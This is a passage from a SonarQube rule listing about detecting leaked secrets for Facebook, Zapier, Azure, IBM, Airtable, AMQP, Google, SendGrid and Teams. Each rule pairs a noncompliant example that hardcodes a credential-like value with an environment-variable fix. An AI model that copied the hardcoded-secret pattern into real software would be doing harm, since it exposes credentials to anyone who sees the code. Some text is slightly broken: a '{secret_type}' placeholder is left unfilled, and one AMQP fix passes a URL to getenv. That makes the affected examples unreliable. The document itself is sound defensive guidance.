<p>Depending on the development platform and the leaked secret type, multiple solutions are currently available.</p>
<h3>Code examples</h3>
<h4>Noncompliant code example</h4>
<pre data-diff-id="1" data-diff-type="noncompliant">
props.set("teams_webhook_url", "https://sonarcompany.webhook.office.com/webhookb2/52feb105-fe74-52b9-8e90-5d165916fe22@61c6aa5a3-6531-4e28-9c0b-33ba1a8aa1ff/IncomingWebhook/f7fb2308e5f14431ace5b7cd0e670e42/4563618c-b03b-4e80-b093-28bb4ff11de8") // Noncompliant
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="1" data-diff-type="compliant">
props.set("teams_webhook_url", System.getenv("TEAMS_WEBHOOK_URL"))
</pre>
<h2>Resources</h2>
<h3>Standards</h3>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/">Top 10 2021 Category A7 - Identification and
  Authentication Failures</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure">Top 10 2017 Category A3 - Sensitive Data
  Exposure</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/798">CWE-798 - Use of Hard-coded Credentials</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/259">CWE-259 - Use of Hard-coded Password</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=secrets:S6688">
              secrets:S6688
            </a>
          </td>
          <td>
            <details>
              <p>Secret leaks often occur when a sensitive piece of authentication data is stored with the source code of an application. Considering the source
code is intended to be deployed across multiple assets, including source code repositories or application hosting servers, the secrets might get
exposed to an unintended audience.</p>
<h2>Why is this an issue?</h2>
<p>In most cases, trust boundaries are violated when a secret is exposed in a source code repository or an uncontrolled deployment environment.
Unintended people who don’t need to know the secret might get access to it. They might then be able to use it to gain unwanted access to associated
services or resources.</p>
<p>The trust issue can be more or less severe depending on the people’s role and entitlement.</p>
<h3>What is the potential impact?</h3>
<p>A Facebook application secret key is a unique authentication token assigned to a Facebook application. It is used to authenticate and authorize the
application to access Facebook’s APIs and services, such as:</p>
<ul>
  <li> retrieving user data </li>
  <li> posting on behalf of users </li>
  <li> accessing various Facebook features </li>
</ul>
<p>Below are some real-world scenarios that illustrate some impacts of an attacker exploiting the secret.</p>
<h4>Compromise of sensitive personal data</h4>
<p>This kind of service is often used to exchange information that could include personal information, chat logs, and other private data that users
have shared on the platform. This is called <a href="https://gdpr.eu/eu-gdpr-personal-data/"><code>Personally Identifiable Information</code></a>.<br>
The leaked app key could provide a gateway for unauthorized individuals to access and misuse this data, compromising the privacy and safety of the
application users.</p>
<p>In many industries and locations, there are legal and compliance requirements to protect sensitive data. If this kind of sensitive personal data
gets leaked, companies face legal consequences, penalties, or violations of privacy laws.</p>
<h4>Phishing and spam</h4>
<p>An attacker can use this secret to spam users or lure them into links to a malicious domain controlled by the attacker.</p>
<p>Spam can cause users to be exposed to the following:</p>
<ul>
  <li> Unsolicited, inappropriate content, such as pornographic material </li>
  <li> Fraudulent attempts to trick users into sending information or money </li>
  <li> Abusive or hateful statements </li>
  <li> False advertising or fraudulent claims </li>
</ul>
<p>Once a user has been phished on a legitimate-seeming third-party website, an attacker can collect the user’s credentials, bypass multi-factor
authentication (MFA), and take over the user’s account on the trusted website.</p>
<h4>Malware distribution</h4>
<p>Due to this vulnerability, malware can be stored and spread, both to users of the service and to other potential targets.<br> A malware depends on
the attacker’s intentions, as the following examples show:</p>
<ul>
  <li> Cryptojacking malware, whose goal is to "mine" cryptocurrencies on the affected computers or servers. </li>
  <li> Spyware that spies out sensitive information from victims. </li>
</ul>
<p>In the worst case, malware can cause the target systems to be completely compromised and allow attackers to infiltrate the systems.</p>
<h2>How to fix it</h2>
<p><strong>Revoke the secret</strong></p>
<p>Revoke any leaked secrets and remove them from the application source code.</p>
<p>Before revoking the secret, ensure that no other applications or processes are using it. Other usages of the secret will also be impacted when the
secret is revoked.</p>
<p><strong>Use a secret vault</strong></p>
<p>A secret vault should be used to generate and store the new secret. This will ensure the secret’s security and prevent any further unexpected
disclosure.</p>
<p>Depending on the development platform and the leaked secret type, multiple solutions are currently available.</p>
<h3>Code examples</h3>
<h4>Noncompliant code example</h4>
<pre data-diff-id="1" data-diff-type="noncompliant">
props.set("facebook_secret", "a569a8eee3802560e1416edbc4ee119d") // Noncompliant
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="1" data-diff-type="compliant">
props.set("facebook_secret", System.getenv("FACEBOOK_SECRET"))
</pre>
<h2>Resources</h2>
<h3>Standards</h3>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/">Top 10 2021 Category A7 - Identification and
  Authentication Failures</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure">Top 10 2017 Category A3 - Sensitive Data
  Exposure</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/798">CWE-798 - Use of Hard-coded Credentials</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/259">CWE-259 - Use of Hard-coded Password</a> </li>
</ul>
<h3>Documentation</h3>
<ul>
  <li> Facebook documentation - <a href="https://developers.facebook.com/docs/facebook-login/security">Login Security</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=secrets:S6720">
              secrets:S6720
            </a>
          </td>
          <td>
            <details>
              <p>Secret leaks often occur when a sensitive piece of authentication data is stored with the source code of an application. Considering the source
code is intended to be deployed across multiple assets, including source code repositories or application hosting servers, the secrets might get
exposed to an unintended audience.</p>
<h2>Why is this an issue?</h2>
<p>In most cases, trust boundaries are violated when a secret is exposed in a source code repository or an uncontrolled deployment environment.
Unintended people who don’t need to know the secret might get access to it. They might then be able to use it to gain unwanted access to associated
services or resources.</p>
<p>The trust issue can be more or less severe depending on the people’s role and entitlement.</p>
<h3>What is the potential impact?</h3>
<p>Zapier webhook URLs have different effects depending on their permissions: They can be used only to write simple messages in instant messaging apps
or trigger other advanced workflows.</p>
<p>Below are some real-world scenarios that illustrate some impacts of an attacker exploiting the secret.</p>
<h4>Phishing and spam</h4>
<p>An attacker can use this {secret_type} to spam users or lure them into links to a malicious domain controlled by the attacker.</p>
<p>Spam can cause users to be exposed to the following:</p>
<ul>
  <li> Unsolicited, inappropriate content, such as pornographic material </li>
  <li> Fraudulent attempts to trick users into sending information or money </li>
  <li> Abusive or hateful statements </li>
  <li> False advertising or fraudulent claims </li>
</ul>
<p>Once a user has been phished on a legitimate-seeming third-party website, an attacker can collect the user’s credentials, bypass multi-factor
authentication (MFA), and take over the user’s account on the trusted website.</p>
<h4>Malware distribution</h4>
<p>Due to this vulnerability, malware can be stored and spread, both to users of the service and to other potential targets.<br> A malware depends on
the attacker’s intentions, as the following examples show:</p>
<ul>
  <li> Cryptojacking malware, whose goal is to "mine" cryptocurrencies on the affected computers or servers. </li>
  <li> Spyware that spies out sensitive information from victims. </li>
</ul>
<p>In the worst case, malware can cause the target systems to be completely compromised and allow attackers to infiltrate the systems.</p>
<h4>Chaining of vulnerabilities</h4>
<p>Triggering arbitrary workflows can lead to problems ranging from a denial of service to worse, depending on how the webhook’s data is handled. If
the webhook performs a specific action that is affected by a vulnerability, the webhook acts as a remote attack vector on the enterprise.</p>
<p>Components affected by this webhook could, for example, experience unexpected failures or excessive resource consumption. If it is a single point
of failure (SPOF), this leak is critical.</p>
<h2>How to fix it</h2>
<p><strong>Revoke the secret</strong></p>
<p>Revoke any leaked secrets and remove them from the application source code.</p>
<p>Before revoking the secret, ensure that no other applications or processes are using it. Other usages of the secret will also be impacted when the
secret is revoked.</p>
<p><strong>Use a secret vault</strong></p>
<p>A secret vault should be used to generate and store the new secret. This will ensure the secret’s security and prevent any further unexpected
disclosure.</p>
<p>Depending on the development platform and the leaked secret type, multiple solutions are currently available.</p>
<h3>Code examples</h3>
<h4>Noncompliant code example</h4>
<pre data-diff-id="1" data-diff-type="noncompliant">
props.set("zapier_webhook_url", "https://hooks.zapier.com/hooks/catch/3017724/t0q8ed/") // Noncompliant
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="1" data-diff-type="compliant">
props.set("zapier_webhook_url", System.getenv("ZAPIER_WEBHOOK_URL"))
</pre>
<h2>Resources</h2>
<h3>Standards</h3>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/">Top 10 2021 Category A7 - Identification and
  Authentication Failures</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure">Top 10 2017 Category A3 - Sensitive Data
  Exposure</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/798">CWE-798 - Use of Hard-coded Credentials</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/259">CWE-259 - Use of Hard-coded Password</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=secrets:S6684">
              secrets:S6684
            </a>
          </td>
          <td>
            <details>
              <p>Secret leaks often occur when a sensitive piece of authentication data is stored with the source code of an application. Considering the source
code is intended to be deployed across multiple assets, including source code repositories or application hosting servers, the secrets might get
exposed to an unintended audience.</p>
<h2>Why is this an issue?</h2>
<p>In most cases, trust boundaries are violated when a secret is exposed in a source code repository or an uncontrolled deployment environment.
Unintended people who don’t need to know the secret might get access to it. They might then be able to use it to gain unwanted access to associated
services or resources.</p>
<p>The trust issue can be more or less severe depending on the people’s role and entitlement.</p>
<h3>What is the potential impact?</h3>
<p>Azure Subscription Keys are used to authenticate and authorize access to Azure resources and services. These keys are unique identifiers that are
associated with an Azure subscription and are used to control access to resources such as virtual machines, storage accounts, and databases.
Subscription keys are typically used in API requests to Azure services, and they help ensure that only authorized users and applications can access
and modify resources within an Azure subscription.</p>
<p>If an Azure Subscription Key is leaked to an unintended audience, it can pose a significant security risk to the Azure subscription and the
resources it contains. An attacker who gains access to a subscription key can use it to authenticate and access resources within the subscription,
potentially causing data breaches, data loss, or other malicious activities.</p>
<p>Depending on the level of access granted by the subscription key, an attacker could potentially create, modify, or delete resources within the
subscription, or even take control of the entire subscription. This could result in significant financial losses, reputational damage, and legal
liabilities for the organization that owns the subscription.</p>
<h2>How to fix it</h2>
<p><strong>Revoke the secret</strong></p>
<p>Revoke any leaked secrets and remove them from the application source code.</p>
<p>Before revoking the secret, ensure that no other applications or processes are using it. Other usages of the secret will also be impacted when the
secret is revoked.</p>
<p><strong>Analyze recent secret use</strong></p>
<p>When available, analyze authentication logs to identify any unintended or malicious use of the secret since its disclosure date. Doing this will
allow determining if an attacker took advantage of the leaked secret and to what extent.</p>
<p>This operation should be part of a global incident response process.</p>
<p>Microsoft Azure provides an activity log that can be used to audit the access to the API.</p>
<p><strong>Use a secret vault</strong></p>
<p>A secret vault should be used to generate and store the new secret. This will ensure the secret’s security and prevent any further unexpected
disclosure.</p>
<p>Depending on the development platform and the leaked secret type, multiple solutions are currently available.</p>
<h3>Code examples</h3>
<h4>Noncompliant code example</h4>
<pre data-diff-id="1" data-diff-type="noncompliant">
props.set("subscription_key", "efbb1a98f026d061464af685cd16dcd3") // Noncompliant
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="1" data-diff-type="compliant">
props.set("subscription_key", System.getenv("SUBSCRIPTION_KEY"))
</pre>
<h2>Resources</h2>
<h3>Standards</h3>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/">Top 10 2021 Category A7 - Identification and
  Authentication Failures</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure">Top 10 2017 Category A3 - Sensitive Data
  Exposure</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/798">CWE-798 - Use of Hard-coded Credentials</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/259">CWE-259 - Use of Hard-coded Password</a> </li>
</ul>
<h3>Documentation</h3>
<ul>
  <li> Microsoft Documentation - <a href="https://learn.microsoft.com/en-us/azure/api-management/api-management-subscriptions">Subscriptions in Azure
  API Management</a> </li>
  <li> Microsoft Documentation - <a href="https://learn.microsoft.com/en-us/azure/azure-monitor/essentials/activity-log">Azure Monitor activity
  log</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=secrets:S6337">
              secrets:S6337
            </a>
          </td>
          <td>
            <details>
              <p>Secret leaks often occur when a sensitive piece of authentication data is stored with the source code of an application. Considering the source
code is intended to be deployed across multiple assets, including source code repositories or application hosting servers, the secrets might get
exposed to an unintended audience.</p>
<h2>Why is this an issue?</h2>
<p>In most cases, trust boundaries are violated when a secret is exposed in a source code repository or an uncontrolled deployment environment.
Unintended people who don’t need to know the secret might get access to it. They might then be able to use it to gain unwanted access to associated
services or resources.</p>
<p>The trust issue can be more or less severe depending on the people’s role and entitlement.</p>
<h3>What is the potential impact?</h3>
<p>Below are some real-world scenarios that illustrate some impacts of an attacker exploiting the secret.</p>
<h4>Phishing and spam</h4>
<p>An attacker can use this {secret_type} to spam users or lure them into links to a malicious domain controlled by the attacker.</p>
<p>Spam can cause users to be exposed to the following:</p>
<ul>
  <li> Unsolicited, inappropriate content, such as pornographic material </li>
  <li> Fraudulent attempts to trick users into sending information or money </li>
  <li> Abusive or hateful statements </li>
  <li> False advertising or fraudulent claims </li>
</ul>
<p>Once a user has been phished on a legitimate-seeming third-party website, an attacker can collect the user’s credentials, bypass multi-factor
authentication (MFA), and take over the user’s account on the trusted website.</p>
<h4>Malware distribution</h4>
<p>Due to this vulnerability, malware can be stored and spread, both to users of the service and to other potential targets.<br> A malware depends on
the attacker’s intentions, as the following examples show:</p>
<ul>
  <li> Cryptojacking malware, whose goal is to "mine" cryptocurrencies on the affected computers or servers. </li>
  <li> Spyware that spies out sensitive information from victims. </li>
</ul>
<p>In the worst case, malware can cause the target systems to be completely compromised and allow attackers to infiltrate the systems.</p>
<h4>Financial loss</h4>
<p>Financial losses can occur when a secret is used to access a paid third-party-provided service and is disclosed as part of the source code of
client applications. Having the secret, each user of the application will be able to use it without limit to use the third party service to their own
need, including in a way that was not expected.</p>
<p>This additional use of the secret will lead to added costs with the service provider.</p>
<p>Moreover, when rate or volume limiting is set up on the provider side, this additional use can prevent the regular operation of the affected
application. This might result in a partial denial of service for all the application’s users.</p>
<h2>How to fix it</h2>
<p><strong>Revoke the secret</strong></p>
<p>Revoke any leaked secrets and remove them from the application source code.</p>
<p>Before revoking the secret, ensure that no other applications or processes are using it. Other usages of the secret will also be impacted when the
secret is revoked.</p>
<p><strong>Use a secret vault</strong></p>
<p>A secret vault should be used to generate and store the new secret. This will ensure the secret’s security and prevent any further unexpected
disclosure.</p>
<p>Depending on the development platform and the leaked secret type, multiple solutions are currently available.</p>
<h3>Code examples</h3>
<h4>Noncompliant code example</h4>
<pre data-diff-id="1" data-diff-type="noncompliant">
props.set("ibm-key", "fDKU7e_u_EnQgWgDVO4b_ubGqVTa5IYwWEey7lMfEB_1") // Noncompliant
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="1" data-diff-type="compliant">
props.set("ibm-key", System.getenv("IBM_KEY"))
</pre>
<h2>Resources</h2>
<h3>Standards</h3>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/">Top 10 2021 Category A7 - Identification and
  Authentication Failures</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure">Top 10 2017 Category A3 - Sensitive Data
  Exposure</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/798">CWE-798 - Use of Hard-coded Credentials</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/259">CWE-259 - Use of Hard-coded Password</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=secrets:S6733">
              secrets:S6733
            </a>
          </td>
          <td>
            <details>
              <p>Secret leaks often occur when a sensitive piece of authentication data is stored with the source code of an application. Considering the source
code is intended to be deployed across multiple assets, including source code repositories or application hosting servers, the secrets might get
exposed to an unintended audience.</p>
<h2>Why is this an issue?</h2>
<p>In most cases, trust boundaries are violated when a secret is exposed in a source code repository or an uncontrolled deployment environment.
Unintended people who don’t need to know the secret might get access to it. They might then be able to use it to gain unwanted access to associated
services or resources.</p>
<p>The trust issue can be more or less severe depending on the people’s role and entitlement.</p>
<h3>What is the potential impact?</h3>
<p>Below are some real-world scenarios that illustrate some impacts of an attacker exploiting the secret.</p>
<h4>Chaining of vulnerabilities</h4>
<p>Triggering arbitrary workflows can lead to problems ranging from a denial of service to worse, depending on how the webhook’s data is handled. If
the webhook performs a specific action that is affected by a vulnerability, the webhook acts as a remote attack vector on the enterprise.</p>
<p>Components affected by this webhook could, for example, experience unexpected failures or excessive resource consumption. If it is a single point
of failure (SPOF), this leak is critical.</p>
<h4>Compromise of sensitive data</h4>
<p>If the affected service is used to store or process personally identifiable information or other sensitive data, attackers knowing an
authentication secret could be able to access it. Depending on the type of data that is compromised, it could lead to privacy violations, identity
theft, financial loss, or other negative outcomes.</p>
<p>In most cases, a company suffering a sensitive data compromise will face a reputational loss when the security issue is publicly disclosed.</p>
<h4>Account termination</h4>
<p>Unauthorized access to mailing service API keys can also result in resource abuse. Attackers can exploit the API keys to send a large volume of
spam emails or perform other resource-intensive operations, causing a significant strain on the mailing service provider’s infrastructure.</p>
<p>The service provider, being vigilant about such activities, may flag your account and take action against it. This could lead to the suspension or
termination of the compromised account, thus causing significant inconvenience and potential loss of communication with your customers or
partners.</p>
<h2>How to fix it</h2>
<p><strong>Revoke the secret</strong></p>
<p>Revoke any leaked secrets and remove them from the application source code.</p>
<p>Before revoking the secret, ensure that no other applications or processes are using it. Other usages of the secret will also be impacted when the
secret is revoked.</p>
<p><strong>Use a secret vault</strong></p>
<p>A secret vault should be used to generate and store the new secret. This will ensure the secret’s security and prevent any further unexpected
disclosure.</p>
<p>Depending on the development platform and the leaked secret type, multiple solutions are currently available.</p>
<h3>Code examples</h3>
<h4>Noncompliant code example</h4>
<pre data-diff-id="1" data-diff-type="noncompliant">
props.set("airtable_key", "key6yLyCekATg67Ts") // Noncompliant
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="1" data-diff-type="compliant">
props.set("airtable_key", System.getenv("AIRTABLE_KEY"))
</pre>
<h2>Resources</h2>
<h3>Standards</h3>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/">Top 10 2021 Category A7 - Identification and
  Authentication Failures</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure">Top 10 2017 Category A3 - Sensitive Data
  Exposure</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/798">CWE-798 - Use of Hard-coded Credentials</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/259">CWE-259 - Use of Hard-coded Password</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=secrets:S6736">
              secrets:S6736
            </a>
          </td>
          <td>
            <details>
              <p>Secret leaks often occur when a sensitive piece of authentication data is stored with the source code of an application. Considering the source
code is intended to be deployed across multiple assets, including source code repositories or application hosting servers, the secrets might get
exposed to an unintended audience.</p>
<h2>Why is this an issue?</h2>
<p>In most cases, trust boundaries are violated when a secret is exposed in a source code repository or an uncontrolled deployment environment.
Unintended people who don’t need to know the secret might get access to it. They might then be able to use it to gain unwanted access to associated
services or resources.</p>
<p>The trust issue can be more or less severe depending on the people’s role and entitlement.</p>
<h3>What is the potential impact?</h3>
<p>AMQP URLs containing credentials allow publishing and consuming messages from the queue.</p>
<p>Below are some real-world scenarios that illustrate some impacts of an attacker exploiting the credentials.</p>
<h4>Compromise of sensitive data</h4>
<p>If the affected service is used to store or process personally identifiable information or other sensitive data, attackers knowing an
authentication secret could be able to access it. Depending on the type of data that is compromised, it could lead to privacy violations, identity
theft, financial loss, or other negative outcomes.</p>
<p>In most cases, a company suffering a sensitive data compromise will face a reputational loss when the security issue is publicly disclosed.</p>
<h4>Malware distribution</h4>
<p>Due to this vulnerability, malware can be stored and spread, both to users of the service and to other potential targets.<br> A malware depends on
the attacker’s intentions, as the following examples show:</p>
<ul>
  <li> Cryptojacking malware, whose goal is to "mine" cryptocurrencies on the affected computers or servers. </li>
  <li> Spyware that spies out sensitive information from victims. </li>
</ul>
<p>In the worst case, malware can cause the target systems to be completely compromised and allow attackers to infiltrate the systems.</p>
<h2>How to fix it</h2>
<p><strong>Revoke the secret</strong></p>
<p>Revoke any leaked secrets and remove them from the application source code.</p>
<p>Before revoking the secret, ensure that no other applications or processes are using it. Other usages of the secret will also be impacted when the
secret is revoked.</p>
<p><strong>Use a secret vault</strong></p>
<p>A secret vault should be used to generate and store the new secret. This will ensure the secret’s security and prevent any further unexpected
disclosure.</p>
<p>Depending on the development platform and the leaked secret type, multiple solutions are currently available.</p>
<h3>Code examples</h3>
<h4>Noncompliant code example</h4>
<pre data-diff-id="1" data-diff-type="noncompliant">
props.set("amqp-url", "amqps://admin:password@example.com:8080/example") // Noncompliant
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="1" data-diff-type="compliant">
props.set("amqp-url", System.getenv("amqps://"+System.getenv("AMQP_CREDENTIALS")+"@example.com:8080/example"))
</pre>
<h2>Resources</h2>
<h3>Standards</h3>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/">Top 10 2021 Category A7 - Identification and
  Authentication Failures</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure">Top 10 2017 Category A3 - Sensitive Data
  Exposure</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/798">CWE-798 - Use of Hard-coded Credentials</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/259">CWE-259 - Use of Hard-coded Password</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=secrets:S6334">
              secrets:S6334
            </a>
          </td>
          <td>
            <details>
              <p>Secret leaks often occur when a sensitive piece of authentication data is stored with the source code of an application. Considering the source
code is intended to be deployed across multiple assets, including source code repositories or application hosting servers, the secrets might get
exposed to an unintended audience.</p>
<h2>Why is this an issue?</h2>
<p>In most cases, trust boundaries are violated when a secret is exposed in a source code repository or an uncontrolled deployment environment.
Unintended people who don’t need to know the secret might get access to it. They might then be able to use it to gain unwanted access to associated
services or resources.</p>
<p>The trust issue can be more or less severe depending on the people’s role and entitlement.</p>
<h3>What is the potential impact?</h3>
<p>Google API keys are used to authenticate applications that consume Google Cloud APIs.</p>
<p>API keys are not strictly secret as they are often embedded into client-side code or mobile applications that consume Google Cloud APIs. Still,
they should be secured.</p>
<h4>Financial loss</h4>
<p>An unrestricted Google API key being disclosed in a public source code could be used by malicious actors to consume Google APIs on behalf of your
application.<br> This will have a financial impact as your organization will be billed for the data consumed by the malicious actor.</p>
<h4>Denial of service</h4>
<p>If your account has enabled quota to cap the API consumption of your application, this quota can be exceeded, leaving your application unable to
request the Google APIs it requires to function properly.</p>
<h2>How to fix it</h2>
<p>Depending on the sensitivity of the key use, only administrators should have access to the Google API keys used by your application.</p>
<p><strong>For client-facing keys</strong></p>
<p>If the key must be sent to clients for the service to run properly, then it does not need to be revoked or added to a Vault, ignore the following
sections.<br> However, it is important to apply <a href="https://cloud.google.com/docs/authentication/api-keys#securing">Google’s guidelines to secure
the API keys</a>.</p>
<p>These best practices will help mitigate abuse of this key.</p>
<p><strong>Revoke the secret</strong></p>
<p>Revoke any leaked secrets and remove them from the application source code.</p>
<p>Before revoking the secret, ensure that no other applications or processes are using it. Other usages of the secret will also be impacted when the
secret is revoked.</p>
<p><strong>Use a secret vault</strong></p>
<p>A secret vault should be used to generate and store the new secret. This will ensure the secret’s security and prevent any further unexpected
disclosure.</p>
<p>Depending on the development platform and the leaked secret type, multiple solutions are currently available.</p>
<h3>Code examples</h3>
<h4>Noncompliant code example</h4>
<pre data-diff-id="1" data-diff-type="noncompliant">
props.set("google-api-key", "zAIJf4Six4MjGwxvkarrf1LPUaCdyNSjzsyIoRI") // Noncompliant
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="1" data-diff-type="compliant">
props.set("google-api-key", System.getenv("GOOGLE_API_KEY"))
</pre>
<h2>Resources</h2>
<h3>Standards</h3>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/">Top 10 2021 Category A7 - Identification and
  Authentication Failures</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure">Top 10 2017 Category A3 - Sensitive Data
  Exposure</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/798">CWE-798 - Use of Hard-coded Credentials</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/259">CWE-259 - Use of Hard-coded Password</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=secrets:S6696">
              secrets:S6696
            </a>
          </td>
          <td>
            <details>
              <p>Secret leaks often occur when a sensitive piece of authentication data is stored with the source code of an application. Considering the source
code is intended to be deployed across multiple assets, including source code repositories or application hosting servers, the secrets might get
exposed to an unintended audience.</p>
<h2>Why is this an issue?</h2>
<p>In most cases, trust boundaries are violated when a secret is exposed in a source code repository or an uncontrolled deployment environment.
Unintended people who don’t need to know the secret might get access to it. They might then be able to use it to gain unwanted access to associated
services or resources.</p>
<p>The trust issue can be more or less severe depending on the people’s role and entitlement.</p>
<h3>What is the potential impact?</h3>
<p>SendGrid keys are used for authentication and authorization when using the SendGrid email delivery service.</p>
<p>Below are some real-world scenarios that illustrate some impacts of an attacker exploiting the secret.</p>
<h4>Compromise of sensitive personal data</h4>
<p>This kind of service is often used to exchange information that could include personal information, chat logs, and other private data that users
have shared on the platform. This is called <a href="https://gdpr.eu/eu-gdpr-personal-data/"><code>Personally Identifiable Information</code></a>.<br>
The leaked app key could provide a gateway for unauthorized individuals to access and misuse this data, compromising the privacy and safety of the
application users.</p>
<p>In many industries and locations, there are legal and compliance requirements to protect sensitive data. If this kind of sensitive personal data
gets leaked, companies face legal consequences, penalties, or violations of privacy laws.</p>
<h4>Phishing and spam</h4>
<p>An attacker can use this secret to spam users or lure them into links to a malicious domain controlled by the attacker.</p>
<p>Spam can cause users to be exposed to the following:</p>
<ul>
  <li> Unsolicited, inappropriate content, such as pornographic material </li>
  <li> Fraudulent attempts to trick users into sending information or money </li>
  <li> Abusive or hateful statements </li>
  <li> False advertising or fraudulent claims </li>
</ul>
<p>Once a user has been phished on a legitimate-seeming third-party website, an attacker can collect the user’s credentials, bypass multi-factor
authentication (MFA), and take over the user’s account on the trusted website.</p>
<h4>Malware distribution</h4>
<p>Due to this vulnerability, malware can be stored and spread, both to users of the service and to other potential targets.<br> A malware depends on
the attacker’s intentions, as the following examples show:</p>
<ul>
  <li> Cryptojacking malware, whose goal is to "mine" cryptocurrencies on the affected computers or servers. </li>
  <li> Spyware that spies out sensitive information from victims. </li>
</ul>
<p>In the worst case, malware can cause the target systems to be completely compromised and allow attackers to infiltrate the systems.</p>
<h4>Account termination</h4>
<p>Unauthorized access to mailing service API keys can also result in resource abuse. Attackers can exploit the API keys to send a large volume of
spam emails or perform other resource-intensive operations, causing a significant strain on the mailing service provider’s infrastructure.</p>
<p>The service provider, being vigilant about such activities, may flag your account and take action against it. This could lead to the suspension or
termination of the compromised account, thus causing significant inconvenience and potential loss of communication with your customers or
partners.</p>
<h2>How to fix it</h2>
<p><strong>Revoke the secret</strong></p>
<p>Revoke any leaked secrets and remove them from the application source code.</p>
<p>Before revoking the secret, ensure that no other applications or processes are using it. Other usages of the secret will also be impacted when the
secret is revoked.</p>
<p><strong>Use a secret vault</strong></p>
<p>A secret vault should be used to generate and store the new secret. This will ensure the secret’s security and prevent any further unexpected
disclosure.</p>
<p>Depending on the development platform and the leaked secret type, multiple solutions are currently available.</p>
<h3>Code examples</h3>
<h4>Noncompliant code example</h4>
<pre data-diff-id="1" data-diff-type="noncompliant">
props.set("sg_key", "SG.Wjo5QoWqTmrFtMUf8m2T.CIY0Z24e5sJawIymiK_ZKC_7I15yDP0ur1yt0qtkR9Go") // Noncompliant
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="1" data-diff-type="compliant">
props.set("sg_key", System.getenv("SG_KEY"))
</pre>
<h2>Resources</h2>
<h3>Standards</h3>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/">Top 10 2021 Category A7 - Identification and
  Authentication Failures</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure">Top 10 2017 Category A3 - Sensitive Data
  Exposure</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/798">CWE-798 - Use of Hard-coded Credentials</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/259">CWE-259 - Use of Hard-coded Password</a> </li>
</ul>
<h3>Documentation</h3>
<ul>
